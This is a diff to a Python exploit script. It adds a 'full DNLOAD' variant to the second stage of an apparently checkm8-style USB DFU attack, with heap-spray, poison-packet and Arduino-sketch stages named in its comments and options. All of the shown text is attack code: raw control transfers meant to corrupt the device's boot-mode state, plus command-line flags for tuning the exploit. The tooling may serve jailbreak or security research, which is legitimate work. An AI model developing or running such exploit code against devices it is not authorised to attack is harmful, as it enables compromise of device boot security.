@@ -735,6 +735,21 @@ def stage2(usb, out_spin_us, padding, debug, live_handle=None):
     # layout can shift it from the Arduino value, so it is sweepable
     # (--padding).
     w_length = padding + 0x40
+    if getattr(stage2, 'poison_append', False) and getattr(stage2, 'full_dnload', False):
+        # Poisoned-state variant: after the [0x40..0x80) poison lands, the
+        # device's data-phase machinery reacts (the unpoisoned remainder
+        # channel capped at 64 bytes in observed runs).  The sketch's own
+        # follow-through is a FULL DNLOAD - 0x40 packets to completion - so
+        # deliver the whole length in one plain transfer and let the status
+        # phase run.
+        data = b'\0' * w_length
+        rc = usb.ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, data, 2000)
+        if debug:
+            print('    [debug] FULL DNLOAD %#x  ctrl rc=%d' % (w_length, rc))
+        if getattr(stage2, 'keep_handle', False):
+            return handle
+        reset_and_release(usb, handle, settle=0.5)
+        return
     data = b'\0' * w_length
     rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, w_length,
                             data, abandon=True, cancel_at=0,
@@ -972,6 +987,7 @@ def exploit(args):
     if args.stage in ('all', '2'):
         stage2.sketch_shape = bool(getattr(args, 'sketch_shape', False))
         stage2.poison_append = bool(getattr(args, 'poison_append', False))
+        stage2.full_dnload = bool(getattr(args, 'stage2_full_dnload', False))
         live2 = stage2(usb, args.out_spin_us, args.padding, args.debug,
                        live_handle=live)
         if live2 is not None:
@@ -1204,6 +1220,11 @@ def main():
                         help='do not reset or re-acquire between stages: keep '
                              'talking on the live spray/armed handle (the '
                              'Arduino never re-enumerates)')
+    parser.add_argument('--stage2-full-dnload', action='store_true', default=False,
+                        help='poisoned-state variant: deliver the whole '
+                             'pending DNLOAD in one plain transfer (the '
+                             'sketch pushes all 28 packets) instead of the '
+                             'cancel+remainder pair')
     parser.add_argument('--poison-append', action='store_true', default=False,
                         help='deliver the sketch set-state poison packet via '
                              'the pending-append channel: first 0x40 by a '
